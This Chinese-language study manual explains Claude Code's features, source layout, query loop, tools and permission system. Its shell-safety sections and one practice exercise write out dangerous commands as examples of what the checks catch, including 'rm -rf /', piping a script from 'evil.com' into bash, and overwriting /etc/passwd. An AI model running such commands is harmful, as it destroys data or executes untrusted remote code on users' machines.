# Claude Code 完整学习手册

> **作者：** 小蛋蛋（技术专家视角）  
> **版本：** 2.0 完整版  
> **最后更新：** 2026-04-09  
> **目标读者：** 想系统学习 Claude Code 的开发者、架构师、技术管理者  
> **前置知识：** TypeScript/Node.js基础、对AI Agent概念有基本了解  
> **预计阅读时间：** 完整阅读 3-5 小时，实践 2-4 周

---

## 📖 阅读指南

### 本手册定位

这不是一份简单的架构分析文档，而是一份可以**拿来直接指导学习和实践 Claude Code 源代码的完整手册**。

**你将学到：**
1. Claude Code 能做什么（功能全景）
2. 代码在哪里（代码地图）
3. 功能如何实现（业务流程）
4. 如何扩展（二次开发）
5. 核心设计思想（架构哲学）

### 学习路径设计

本手册采用**渐进式学习设计**，从功能认知到源码深入，分为四个阶段：

```
┌─────────────────────────────────────────────────────────┐
│                    学习路径金字塔                        │
├─────────────────────────────────────────────────────────┤
│                                                         │
│                        /\                               │
│                       /  \                              │
│                      /    \                             │
│                     / ④   \                            │
│                    /--------\                           │
│                   /  源码    \                          │
│                  /  深入     \                         │
│                 /------------\                        │
│                /     ③       \                       │
│               /    业务流程    \                      │
│              /-----------------\                     │
│             /        ②         \                    │
│            /      架构全景      \                   │
│           /---------------------\                  │
│          /          ①           \                 │
│         /      功能模块入口       \                │
│        /---------------------------\               │
│       /            ①               \              │
│      /      能干什么？怎么用？       \             │
│     /-------------------------------\            │
│    /                ①                \           │
│   /          快速上手指南              \          │
│  /-------------------------------------\         │
│ /                  ①                   \        │
│/            基础认知阶段                 \       │
└─────────────────────────────────────────────────┘
```

**阶段 ①：基础认知（1-2 天）**
- 了解 Claude Code 能做什么
- 学会基本使用
- 建立整体印象

**阶段 ②：架构全景（2-3 天）**
- 理解整体架构
- 掌握模块划分
- 理清调用关系

**阶段 ③：业务流程（1-2 周）**
- 深入核心流程
- 理解实现细节
- 掌握关键算法

**阶段 ④：源码深入（2-4 周）**
- 阅读核心源码
- 实践二次开发
- 具备扩展能力

### 如何使用本手册

**快速查阅：**
- 每个章节都有「关键文件」标注，直接定位源码
- 每个流程都有「调用链路」图示，快速理解
- 每个概念都有「实践练习」，动手巩固

**深度学习：**
- 按顺序阅读，建立完整知识体系
- 完成每章的实践练习
- 参考附录的代码示例

---

# 第一部分：功能模块入口

## 第 1 章：Claude Code 能干什么

### 1.1 核心功能全景

Claude Code 是一个**完整的 Agentic AI 系统**，不是简单的聊天界面。它能在终端中与 Claude 模型交互，执行各种编程任务。

**六大核心能力：**

```
┌─────────────────────────────────────────────────────────────┐
│                    Claude Code 核心能力                      │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │  文件操作    │  │  Shell 执行   │  │  代码搜索    │      │
│  │  读写/编辑   │  │  命令/脚本   │  │  grep/glob  │      │
│  └──────────────┘  └──────────────┘  └──────────────┘      │
│                                                             │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │  Web 能力    │  │  多 Agent    │  │  IDE 集成    │      │
│  │  抓取/搜索   │  │  协作/编排   │  │  VSCode/JB  │      │
│  └──────────────┘  └──────────────┘  └──────────────┘      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 功能模块详细清单

#### 1.2.1 文件操作模块

**能干什么：**
- 读取文件内容（支持图片、PDF 等二进制文件）
- 写入新文件
- 编辑现有文件（字符串替换）
- 管理 Jupyter Notebook

**对应工具：**
| 工具 | 功能 | 权限要求 |
|------|------|---------|
| FileReadTool | 读取文件 | 自动允许 |
| FileWriteTool | 写入文件 | 需要确认 |
| FileEditTool | 编辑文件 | 需要确认 |

**关键文件：**
```
src/tools/FileReadTool/
src/tools/FileWriteTool/
src/tools/FileEditTool/
```

**使用示例：**
```bash
# 读取文件
claude
> 请读取 src/main.ts 的内容

# 写入文件
> 创建一个新文件 hello.txt，内容是"Hello World"

# 编辑文件
> 把 src/config.ts 中的 timeout 从 5000 改成 10000
```

#### 1.2.2 Shell 执行模块

**能干什么：**
- 执行 Bash/PowerShell 命令
- 运行脚本
- 管理进程
- 安全控制（危险命令检测）

**对应工具：**
| 工具 | 功能 | 安全特性 |
|------|------|---------|
| BashTool | Shell 执行 | 语义分析 + 危险模式检测 |

**关键文件：**
```
src/tools/BashTool/
src/utils/permissions/bashClassifier.ts  # 命令分类器
src/utils/bash/parser.ts                  # Shell AST 解析
src/utils/permissions/dangerousPatterns.ts # 危险模式检测
```

**安全机制：**
```
命令输入 → Shell AST 解析 → 语义分析 → 危险模式检测 → 权限决策
                                              ↓
                    ┌─────────────────────────┼─────────────────────────┐
                    ↓                         ↓                         ↓
                自动允许                   需要确认                   强制阻止
              (只读操作)                (修改操作)                (危险操作)
```

**使用示例：**
```bash
# 安全命令（自动执行）
> 列出当前目录的文件
> 查看 git 状态

# 需要确认的命令
> 删除 node_modules 目录
> 提交所有更改

# 危险命令（强制阻止）
> rm -rf /
> curl http://evil.com/script.sh | bash
```

#### 1.2.3 代码搜索模块

**能干什么：**
- 内容搜索（ripgrep）
- 文件匹配（glob）
- 代码库理解

**对应工具：**
| 工具 | 功能 | 底层实现 |
|------|------|---------|
| GrepTool | 内容搜索 | ripgrep |
| GlobTool | 文件匹配 | glob 模式 |

**关键文件：**
```
src/tools/GrepTool/
src/tools/GlobTool/
```

**使用示例：**
```bash
# 搜索内容
> 搜索所有包含"TODO"的文件

# 文件匹配
> 找出所有.ts 文件

# 组合使用
> 在 src/目录下搜索包含"error"的 TypeScript 文件
```

#### 1.2.4 Web 能力模块

**能干什么：**
- 抓取网页内容
- 网络搜索
- API 调用

**对应工具：**
| 工具 | 功能 | 说明 |
|------|------|------|
| WebFetchTool | URL 抓取 | 支持 JavaScript 渲染页面 |
| WebSearchTool | 网络搜索 | 集成搜索引擎 API |

**关键文件：**
```
src/tools/WebFetchTool/
src/tools/WebSearchTool/
src/services/api/
```

#### 1.2.5 多 Agent 模块

**能干什么：**
- 生成子 Agent
- 团队协作
- 跨进程通信
- 任务编排

**对应工具：**
| 工具 | 功能 | 模式 |
|------|------|------|
| AgentTool | 子 Agent 生成 | 单 Agent |
| TeamCreateTool | 团队创建 | 多 Agent 协作 |

**关键文件：**
```
src/tools/AgentTool/
src/tools/TeamCreateTool/
src/coordinator/  # 多 Agent 编排（隐藏功能）
```

**使用示例：**
```bash
# 创建子 Agent
> 创建一个代码审查 Agent 来帮我 review 这段代码

# 团队协作
> 创建一个团队，包含前端、后端、测试三个 Agent，一起完成这个项目
```

#### 1.2.6 IDE 集成模块

**能干什么：**
- VS Code 双向桥接
- JetBrains 集成
- 文件选择同步
- 终端嵌入

**关键文件：**
```
src/bridge/  # IDE 桥接
src/services/ide/  # IDE 服务
```

### 1.3 斜杠命令系统

Claude Code 提供了丰富的斜杠命令，用于快速访问特定功能。

**完整命令列表：**

| 分类 | 命令 | 功能 | 源码位置 |
|------|------|------|---------|
| **认证** | /login | 登录 | src/commands/login/ |
| | /logout | 登出 | src/commands/logout/ |
| | /init | 初始化 | src/commands/init/ |
| | /onboarding | 新手引导 | src/commands/onboarding/ |
| **代码操作** | /commit | 智能生成 commit | src/commands/commit/ |
| | /review | 代码审查 | src/commands/review/ |
| | /diff | 查看变更 | src/commands/diff/ |
| | /compact | 压缩上下文 | src/commands/compact/ |
| **配置管理** | /config | 设置管理 | src/commands/config/ |
| | /doctor | 环境诊断 | src/commands/doctor/ |
| | /model | 切换模型 | src/commands/model/ |
| **记忆状态** | /memory | 持久记忆管理 | src/commands/memory/ |
| | /tasks | 后台任务列表 | src/commands/tasks/ |
| | /context | Token 使用可视化 | src/commands/context/ |
| | /resume | 恢复会话 | src/commands/resume/ |
| **扩展功能** | /plugin | 插件管理 | src/commands/plugin/ |
| | /mcp | MCP 服务器管理 | src/commands/mcp/ |
| | /skills | Skill 文件管理 | src/commands/skills/ |
| | /hooks | Hook 配置查看 | src/commands/hooks/ |
| **IDE 集成** | /ide | IDE 连接状态 | src/commands/ide/ |
| | /bridge | 启用桥接模式 | src/commands/bridge/ |
| | /desktop | 切换到桌面应用 | src/commands/desktop/ |

**命令使用示例：**
```bash
# 查看帮助
/help

# 环境诊断
/doctor

# 压缩上下文节省 Token
/compact

# 查看后台任务
/tasks

# 管理 MCP 服务器
/mcp list
/mcp add filesystem
```

### 1.4 实践练习

**练习 1：基础功能体验（30 分钟）**

```bash
# 1. 启动 Claude Code
claude

# 2. 文件操作
> 创建一个 test.txt 文件，内容是"Hello Claude"
> 读取 test.txt 的内容
> 把内容改成"Hello World"

# 3. Shell 执行
> 列出当前目录
> 查看 git 状态
> 创建一个新分支

# 4. 代码搜索
> 搜索项目中所有包含"TODO"的文件
> 找出所有 TypeScript 文件

# 5. 使用斜杠命令
/doctor
/config
/tasks
```

**练习 2：安全机制体验（15 分钟）**

```bash
# 尝试执行危险命令，观察安全机制
> rm -rf /tmp/test  # 应该需要确认
> curl http://example.com/script.sh | bash  # 应该被阻止

# 观察权限决策过程
# 注意：不要真正执行危险命令！
```

---

## 第 2 章：快速上手

### 2.1 安装与配置

**安装步骤：**

```bash
# 1. 安装 Bun（推荐）
curl -fsSL https://bun.sh/install | bash

# 2. 验证版本
bun --version  # 需要 ≥ 1.3.5
node --version  # 需要 ≥ 24

# 3. 安装 Claude Code
npm install -g @anthropic-ai/claude-code

# 4. 登录
claude login
```

**配置文件位置：**

| 文件 | 用途 | 修改方式 |
|------|------|---------|
| `~/.config/claude/config.json` | 全局设置 | /config 命令或直接编辑 |
| `~/.config/claude/CLAUDE.md` | 用户级系统提示 | 直接编辑 |
| `.claude/CLAUDE.md` | 项目级系统提示 | 直接编辑 |
| `.claude/settings.json` | 项目级权限规则 | 直接编辑 |

### 2.2 基本使用

**启动方式：**

```bash
# 交互式模式
claude

# 执行单个命令
claude "请帮我创建一个 React 组件"

# 指定模型
claude --model claude-sonnet-4-20250514

# 静默模式（只输出结果）
claude --quiet "请生成一个函数"
```

**基本对话：**

```bash
claude

你好！我是 Claude，你的 AI 编程助手。
我可以帮你：
- 读写和编辑文件
- 执行 Shell 命令
- 搜索代码
- 审查代码
- 等等...

你想让我帮你做什么？

> 请帮我创建一个简单的 Express 服务器

好的，我来帮你创建一个 Express 服务器。
首先，让我检查一下当前目录结构...
```

### 2.3 权限模式

**三种权限模式：**

| 模式 | 行为 | 适用场景 |
|------|------|---------|
| auto | 自动批准所有工具调用 | 受信任环境 |
| ask | 交互式确认对话框 | 日常使用（默认） |
| deny | 阻止所有调用 | 只读模式 |

**切换权限模式：**

```bash
# 在对话中
/permissions auto
/permissions ask
/permissions deny

# 或在配置文件中
{
  "permissions": {
    "mode": "ask"
  }
}
```

---

# 第二部分：架构全景

## 第 3 章：整体架构

### 3.1 系统架构图

```
┌─────────────────────────────────────────────────────────────────┐
│                         用户界面层                               │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │              Terminal UI (React + Ink)                   │   │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐ │   │
│  │  │  Message │  │   Task   │  │  Dialog  │  │  Status  │ │   │
│  │  │  List    │  │   List   │  │          │  │   Line   │ │   │
│  │  └──────────┘  └──────────┘  └──────────┘  └──────────┘ │   │
│  └─────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                         核心编排层                               │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │                  QueryEngine                            │   │
│  │  （对话生命周期管理，Tool-Call 循环，成本追踪）            │   │
│  └─────────────────────────────────────────────────────────┘   │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐        │
│  │   Context    │  │    State     │  │    Cost      │        │
│  │   Manager    │  │   Manager    │  │   Tracker    │        │
│  └──────────────┘  └──────────────┘  └──────────────┘        │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                         工具执行层                               │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐       │
│  │   File   │  │   Bash   │  │   Grep   │  │   Web    │       │
│  │  Tools   │  │   Tool   │  │   Tool   │  │  Tools   │       │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘       │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐       │
│  │  Agent   │  │   Task   │  │   MCP    │  │  Skills  │       │
│  │  Tools   │  │  Tools   │  │  Tools   │  │  Tools   │       │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘       │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                         服务集成层                               │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐       │
│  │  Claude  │  │   MCP    │  │   IDE    │  │  Remote  │       │
│  │   API    │  │  Server  │  │  Bridge  │  │  Session │       │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘       │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 代码地图

**完整目录结构：**

```
src/
├── main.tsx                    # 【入口】CLI 主入口，从这里开始阅读
├── setup.ts                    # 【入口】环境验证与初始化
├── Tool.ts                     # 【核心】工具接口定义
├── tools.ts                    # 【核心】工具注册与路由
├── QueryEngine.ts              # 【核心】查询引擎（对话编排）
├── query.ts                    # 【核心】LLM 调用循环
├── context.ts                  # 【核心】上下文管理
├── state.ts                    # 【核心】状态管理
├── cost-tracker.ts             # 【工具】成本追踪
│
├── entrypoints/                # 【入口】各模式入口
│   ├── cli.tsx                 # CLI bootstrap
│   ├── init.ts                 # 初始化（遥测、设置）
│   ├── mcp.ts                  # MCP 服务器入口
│   └── agentSdkTypes.ts        # SDK 类型定义
│
├── commands/                   # 【功能】60+ 斜杠命令
│   ├── commit.ts               # /commit
│   ├── review.ts               # /review
│   ├── compact.ts              # /compact
│   ├── config.ts               # /config
│   ├── doctor.ts               # /doctor
│   ├── mcp.ts                  # /mcp
│   ├── plugin.ts               # /plugin
│   ├── memory.ts               # /memory
│   ├── tasks.ts                # /tasks
│   └── ...
│
├── tools/                      # 【核心】50+ 工具实现
│   ├── BashTool/               # Shell 执行
│   ├── FileReadTool/           # 文件读取
│   ├── FileWriteTool/          # 文件写入
│   ├── FileEditTool/           # 文件编辑
│   ├── GlobTool/               # 文件匹配
│   ├── GrepTool/               # 代码搜索
│   ├── WebFetchTool/           # URL 抓取
│   ├── WebSearchTool/          # 网络搜索
│   ├── AgentTool/              # 子 Agent 生成
│   ├── SkillTool/              # Skill 执行
│   ├── TeamCreateTool/         # 团队创建
│   └── ...
│
├── components/                 # 【UI】140+ Ink UI 组件
├── hooks/                      # 【UI】100+ React Hooks
│
├── services/                   # 【服务】外部服务集成
│   ├── api/                    # API 服务
│   │   ├── bootstrap.ts        # 客户端数据拉取
│   │   ├── claude.ts           # 流式 API 调用
│   │   ├── filesApi.ts         # 文件上传/下载
│   │   └── errors.ts           # API 错误分类
│   ├── mcp/                    # MCP 服务
│   │   ├── client.ts           # MCP 客户端
│   │   └── officialRegistry.ts # 官方注册表
│   ├── analytics/              # 分析服务
│   │   ├── growthbook.ts       # Feature Gate
│   │   └── datadog.ts          # Datadog 导出
│   └── ide/                    # IDE 集成
│
├── bridge/                     # 【集成】IDE 双向桥接
├── coordinator/                # 【高级】多 Agent 编排
├── remote/                     # 【高级】远程会话管理
├── tasks/                      # 【核心】任务状态管理
├── memdir/                     # 【记忆】持久记忆目录扫描
├── migrations/                 # 【配置】配置版本迁移
├── plugins/                    # 【扩展】内置插件
├── skills/                     # 【扩展】Skill 系统
├── state/                      # 【状态】应用状态管理
├── ink/                        # 【UI】自定义 Ink 终端渲染器
├── keybindings/                # 【UI】键位绑定系统
├── vim/                        # 【UI】Vim 模式实现
├── utils/                      # 【工具】330+ 工具模块
│   ├── git.ts                  # Git 操作
│   ├── claudemd.ts             # 记忆文件处理
│   ├── sessionStorage.ts       # 会话存储
│   ├── config.ts               # 配置管理
│   ├── permissions/            # 权限相关
│   │   ├── bashClassifier.ts   # Bash 命令分类
│   │   └── dangerousPatterns.ts # 危险模式检测
│   └── ...
└── ...
```

### 3.3 核心模块关系图

```
┌─────────────────────────────────────────────────────────────────┐
│                        模块调用关系                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  main.tsx (入口)                                                │
│      │                                                          │
│      ▼                                                          │
│  entrypoints/init.ts (初始化)                                   │
│      │                                                          │
│      ├──► commands.ts (命令注册)                                │
│      │       │                                                  │
│      │       └──► commands/* (60+ 命令实现)                     │
│      │                                                          │
│      ├──► tools.ts (工具注册)                                   │
│      │       │                                                  │
│      │       └──► tools/* (50+ 工具实现)                        │
│      │                                                          │
│      └──► QueryEngine.ts (查询引擎)                             │
│              │                                                  │
│              ├──► context.ts (上下文管理)                       │
│              ├──► state.ts (状态管理)                           │
│              ├──► query.ts (LLM 调用循环)                       │
│              │       │                                          │
│              │       └──► services/api/claude.ts (API 调用)    │
│              │                                                  │
│              └──► Tool.execute() (工具执行)                     │
│                      │                                          │
│                      └──► services/mcp/ (MCP 集成)             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 3.4 阅读顺序建议

**第一阶段：核心流程（2-3 小时）**

```
1. src/main.tsx          → 理解 CLI 入口和参数解析
2. src/entrypoints/init.ts → 理解初始化流程
3. src/QueryEngine.ts    → 理解对话编排核心
4. src/query.ts          → 理解 LLM 调用循环
5. src/Tool.ts           → 理解工具接口定义
6. src/tools.ts          → 理解工具注册与路由
```

**第二阶段：工具系统（3-4 小时）**

```
1. src/tools/BashTool.ts      → Shell 执行
2. src/tools/FileReadTool.ts  → 文件读取
3. src/tools/FileWriteTool.ts → 文件写入
4. src/tools/GrepTool.ts      → 代码搜索
5. src/tools/WebFetchTool.ts  → 网页抓取
```

**第三阶段：服务层（2-3 小时）**

```
1. src/services/api/claude.ts    → API 调用
2. src/services/mcp/client.ts    → MCP 客户端
3. src/services/analytics/       → 分析服务
```

**第四阶段：高级功能（选读）**

```
1. src/coordinator/    → 多 Agent 编排
2. src/bridge/         → 远程控制
3. src/assistant/      → 持久助手
4. src/buddy/          → AI 宠物
```

---

## 第 4 章：启动流程

### 4.1 多阶段初始化管线

Claude Code 采用多阶段初始化管线，重点优化启动速度。

**启动流程图：**

```
bun run dev
    │
    ├─────────────────────────────────────────────────────────┐
    │ Phase 0: 副作用（0ms，异步触发）                         │
    │ startMdmRawRead() + startKeychainPrefetch()             │
    │ 利用 Bun 的并发 I/O，将 macOS 冷启动从 300ms 降至 150ms    │
    └─────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ Phase 1: 模块加载（~100ms）                                  │
│ ~135 个顶层 import 求值                                      │
│ 与 Phase 0 并行执行                                          │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ Phase 2: 并行初始化（~50ms）                                 │
│ GrowthBook + Bootstrap API + Policy                         │
│ 使用 Promise.all 并行执行                                    │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ Phase 3: 命令/工具注册（~20ms）                              │
│ getCommands + getTools + MCP 连接                            │
│ 懒加载循环依赖                                               │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│ Phase 4: UI 启动（~10ms）                                    │
│ launchRepl / print mode                                     │
│ React/Ink 渲染                                              │
└─────────────────────────────────────────────────────────────┘
```

### 4.2 关键入口文件

**src/main.tsx（~1600 行）**

主入口，负责：
1. 并行预取：MDM/Keychain/API预连接
2. profileCheckpoint() 性能标记
3. Feature Gate 条件加载
4. Commander.js CLI 参数解析
5. 根据模式选择入口 (REPL/Server/...)

**src/setup.ts**

环境验证与初始化：
1. Node.js 版本检查
2. Git 检测与 Worktree 管理
3. 终端备份/恢复 (iTerm2/Terminal)
4. Tmux 会话创建
5. Session ID 生成与持久化

**src/entrypoints/init.ts**

信任后初始化：
1. 遥测系统 (OpenTelemetry+Datadog)
2. 策略限制与托管设置加载
3. Bootstrap 数据拉取
4. LSP Server Manager 初始化

### 4.3 启动优化要点

**1. 预取链并行**
```typescript
// 在所有 import 语句执行之前以副作用方式触发
startMdmRawRead();      // macOS MDM 读取
startKeychainPrefetch(); // Keychain 查找
prefetchAPI();          // API 预连接
```

**2. 编译时死代码消除**
```typescript
// 通过 bun:bundle 实现
if (feature('KAIROS')) {
  // 只有启用 KAIROS 时才包含此代码
  initKAIROS();
}
// 外部版本中，这段代码被完全移除
```

**3. 延迟加载**
```typescript
// Coordinator、Assistant、Voice 等模块按需 dynamic require
const coordinator = await import('./coordinator');
```

---

# 第三部分：业务流程实现

## 第 5 章：查询引擎（QueryEngine）

### 5.1 核心职责

QueryEngine 是整个系统的大脑，管理一次完整对话的生命周期。

**文件位置：** `src/QueryEngine.ts`（约 1300 行）

**核心职责：**
- 对话生命周期管理
- Tool-Call 循环编排
- Token 预算控制
- 成本追踪
- 状态更新

### 5.2 类结构

```typescript
class QueryEngine {
  // 核心属性
  private messages: Message[];           // 对话消息
  private tasks: TaskState[];            // 后台任务
  private permissions: PermissionState;  // 权限状态
  private costTracker: CostTracker;      // 成本追踪
  
  // 核心方法
  async submitMessage(input: string): Promise<void>;
  async processTurn(): Promise<void>;
  async executeTool(toolCall: ToolCall): Promise<ToolResult>;
  
  // 辅助方法
  private buildSystemPrompt(): string;
  private calculateTokenWarningState(): void;
  private compressMessages(): void;
}
```

### 5.3 Tool-Call 主循环

**核心流程：**

```
用户输入
  │
  ▼
processUserInput()         // 输入预处理与归一化
  │
  ▼
Message normalization       // 消息格式化
  │
  ▼
┌─────────────────────────────────────────────────────────────┐
│                    Tool execution loop                       │
│                                                             │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 1. 调用 LLM API                                      │   │
│  │    response = await callLLM(messages)               │   │
│  └─────────────────────────────────────────────────────┘   │
│                          │                                   │
│                          ▼                                   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 2. 检查是否需要调用工具                               │   │
│  │    if (response.toolCalls) {                        │   │
│  └─────────────────────────────────────────────────────┘   │
│                          │                                   │
│                          ▼                                   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 3. 执行工具                                          │   │
│  │    for (const toolCall of response.toolCalls) {     │   │
│  │      const result = await executeTool(toolCall);    │   │
│  │      messages.push({ role: 'tool', content: result });│   │
│  │    }                                                │   │
│  └─────────────────────────────────────────────────────┘   │
│                          │                                   │
│                          ▼                                   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 4. 成本追踪与 API 调用                                 │   │
│  │    costTracker.track(response.usage);               │   │
│  └─────────────────────────────────────────────────────┘   │
│                          │                                   │
│                          ▼                                   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 5. 状态更新                                          │   │
│  │    updateAppState();                                │   │
│  └─────────────────────────────────────────────────────┘   │
│                          │                                   │
│                          ▼                                   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 6. UI 渲染                                           │   │
│  │    renderUI();                                      │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  循环直到完成或达到限制                                      │
└─────────────────────────────────────────────────────────────┘
  │
  ▼
返回结果
```

### 5.4 系统提示构建优先级

| 优先级 | 来源 | 行为 |
|--------|------|------|
| 1（最高） | CLI 参数 / 配置 | 完全替换所有 prompt |
| 2 | Coordinator 模式 | 多 Agent 协调专用 prompt |
| 3 | Agent 定义（.claude/agents/*.md） | 替换或追加 |
| 4 | Custom --system-prompt | 替换默认 prompt |
| 5（普通） | 内置 Claude Code prompt | 标准行为 |
| Append | --append-system-prompt | 始终追加到末尾 |
| Inject | CLAUDE.md（项目/用户目录） | 作为 attachment 注入上下文 |

### 5.5 关键特性

**1. Token 预算控制**
```typescript
// 防止预算溢出
calculateTokenWarningState() {
  const remainingTokens = this.maxTokens - this.usedTokens;
  if (remainingTokens < this.warningThreshold) {
    this.showWarning();
  }
  if (remainingTokens < this.criticalThreshold) {
    this.triggerCompression();
  }
}
```

**2. 自动压缩**
```typescript
// 接近上下文限制时基于边界的消息压缩
compressMessages() {
  // 保留最新的消息，压缩早期的消息
  const compressed = this.messages.slice(-this.keepCount);
  this.messages = compressed;
}
```

**3. 响应式压缩（Feature-gated）**
```typescript
// 基于启发式的智能消息折叠
if (feature('REACTIVE_COMPACT')) {
  this.reactiveCompress();
}
```

**4. 上下文折叠（Feature-gated）**
```typescript
// 大上下文场景的专用压缩策略
if (feature('CONTEXT_COLLAPSE')) {
  this.collapseContext();
}
```

---

## 第 6 章：工具系统（Tool System）

### 6.1 工具接口定义

**文件位置：** `src/Tool.ts`

**核心接口：**

```typescript
interface Tool<InputSchema extends z.ZodType, OutputType> {
  // 基本信息
  name: string;
  description: string;
  searchHint: string;
  
  // 输入 Schema
  inputSchema: InputSchema;
  
  // 执行方法
  call(
    args: z.infer<InputSchema>,
    context: ToolUseContext,
    canUseTool: () => Promise<boolean>,
    parentMsg: Message,
    onProgress: (progress: Progress) => void
  ): Promise<ToolResult<OutputType>>;
  
  // 辅助方法
  description(input: z.infer<InputSchema>): Promise<string>;
  isEnabled(): boolean;
  isReadOnly(): boolean;
  isConcurrencySafe(): boolean;
  isDestructive(): boolean;
  
  // 限制
  maxResultSizeChars: number;
}
```

### 6.2 工具执行流程

```
用户/模型请求工具
    │
    ▼
toolMatchesName() → findToolByName()   // 名称匹配
    │
    ▼
useCanUseTool() Hook                   // 权限检查 (auto/ask/deny)
    │
    ▼
ToolUseContext 构建                    // 注入上下文
    │                                   // （用户输入、工作目录、模型列表）
    ▼
Tool.execute()                         // 执行
    │
    ▼
结果返回 + 成本追踪
```

### 6.3 核心工具详解

#### 6.3.1 BashTool

**文件位置：** `src/tools/BashTool/`

**功能：** Shell 命令执行

**安全机制：**
```typescript
// 1. Shell AST 解析
const ast = parseShell(command);

// 2. 语义分析
const analysis = analyzeSemantics(ast);

// 3. 危险模式检测
if (isDangerous(analysis)) {
  // 强制确认或阻止
  requireConfirmation();
}

// 4. 执行
const result = await execute(command);
```

**危险命令示例：**

| 风险等级 | 命令示例 | 处理方式 |
|---------|---------|---------|
| 极高 | `rm -rf /` | 强制交互确认，显示警告 |
| 极高 | `curl | bash` | 强制交互确认 |
| 高 | `> /etc/passwd` | 检测输出重定向目标路径 |
| 中 | `chmod 777` | 提示警告，需用户确认 |
| 中 | `git push` | 标准权限检查流程 |
| 低 | `ls`, `cat`, `grep` | 自动允许，不中断用户 |

#### 6.3.2 FileReadTool

**文件位置：** `src/tools/FileReadTool/`

**功能：** 文件读取（支持图片、PDF 等二进制文件）

**实现要点：**
```typescript
async call(args, context) {
  const { path } = args;
  
  // 1. 权限检查（只读操作自动允许）
  if (!await canUseTool()) {
    return { error: 'Permission denied' };
  }
  
  // 2. 读取文件
  const content = await fs.readFile(path);
  
  // 3. 处理二进制文件
  if (isBinary(content)) {
    return { type: 'image', data: encodeBase64(content) };
  }
  
  // 4. 返回文本内容
  return { type: 'text', content: content.toString() };
}
```

#### 6.3.3 AgentTool

**文件位置：** `src/tools/AgentTool/`

**功能：** 子 Agent 生成

**实现要点：**
```typescript
async call(args, context) {
  const { prompt, role } = args;
  
  // 1. 创建子 Agent
  const agent = await createAgent({
    role: role,
    systemPrompt: buildAgentPrompt(role),
    tools: getAvailableTools()
  });
  
  // 2. 执行任务
  const result = await agent.execute(prompt);
  
  // 3. 返回结果
  return { agentId: agent.id, result: result };
}
```

### 6.4 工具并发执行模型

```typescript
// 支持并发执行多个工具
async function executeToolsConcurrently(toolCalls: ToolCall[]) {
  const results = await Promise.all(
    toolCalls.map(call => executeTool(call))
  );
  return results;
}

// 但有并发限制
const MAX_CONCURRENT_TOOLS = 5;
```

---

## 第 7 章：命令系统（Command System）

### 7.1 命令注册机制

**文件位置：** `src/commands.ts`

**注册流程：**

```typescript
// 1. 定义命令
const commitCommand = {
  name: 'commit',
  description: '智能生成 Git commit',
  handler: async (args, context) => {
    // 命令实现
  }
};

// 2. 注册命令
registerCommand(commitCommand);

// 3. 条件导入（DCE）
if (feature('GIT_COMMANDS')) {
  import('./commands/commit');
}
```

### 7.2 命令解析流程

```
用户输入 /commandName args
    │
    ▼
messageQueueManager.ts 解析
    │
    ▼
修改消息队列优先级
    │
    ▼
直接响应或排队处理
```

### 7.3 核心命令实现

#### 7.3.1 /commit

**文件位置：** `src/commands/commit/`

**功能：** 智能生成 Git commit

**实现流程：**
```
1. 获取 git diff
    │
    ▼
2. 分析变更内容
    │
    ▼
3. 调用 LLM 生成 commit message
    │
    ▼
4. 显示预览
    │
    ▼
5. 用户确认后执行 git commit
```

#### 7.3.2 /compact

**文件位置：** `src/commands/compact/`

**功能：** 压缩对话上下文以节省 Token

**实现流程：**
```
1. 分析当前消息列表
    │
    ▼
2. 识别可压缩的消息
    │
    ▼
3. 调用 LLM 生成摘要
    │
    ▼
4. 替换原消息为摘要
    │
    ▼
5. 更新 Token 计数
```

---

# 第四部分：核心机制

## 第 8 章：权限系统

### 8.1 权限决策流程

```
工具调用请求
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│                    权限决策流程                              │
│                                                             │
│  1. Bash 命令分类器 (bashClassifier.ts)                     │
│     语义分析 Shell 命令安全性                                │
│                                                             │
│  2. 危险模式检测 (dangerousPatterns.ts)                     │
│     正则 + 启发式检测文件删除、秘密外泄等                     │
│                                                             │
│  3. YOLO 分类器                                             │
│     高置信度场景自动通过                                     │
│                                                             │
│  4. 拒绝追踪 (DenialTrackingState)                          │
│     防止重复弹窗                                             │
│                                                             │
│  5. Scratchpad 权限门控                                      │
│     敏感操作额外审查                                         │
│                                                             │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
权限决策结果
    │
    ├──► auto → 自动批准
    ├──► ask  → 交互式确认
    └──► deny → 阻止调用
```

